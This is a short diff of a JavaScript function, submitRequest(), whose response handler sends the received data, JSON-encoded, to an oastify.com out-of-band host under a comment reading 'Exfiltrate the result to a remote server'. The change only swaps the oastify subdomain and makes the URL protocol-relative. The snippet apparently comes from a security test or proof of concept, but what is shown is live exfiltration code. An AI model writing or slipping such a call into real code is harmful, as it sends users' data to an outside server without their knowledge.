@@ -21,7 +21,7 @@ function submitRequest() {
     console.log("Response data:", data);
 
     // Exfiltrate the result to a remote server
-    fetch(`https://1z1f5krsnflbw7918qzikh2bs2ytmmab.oastify.com/exfil?data==${encodeURIComponent(JSON.stringify(data))}`, {
+    fetch(`//6ovkupgxckaglcy6xvon9mrgh7nybtzi.oastify.com/exfil?data==${encodeURIComponent(JSON.stringify(data))}`, {
       method: "GET",
     })
     .then(exfilResponse => {
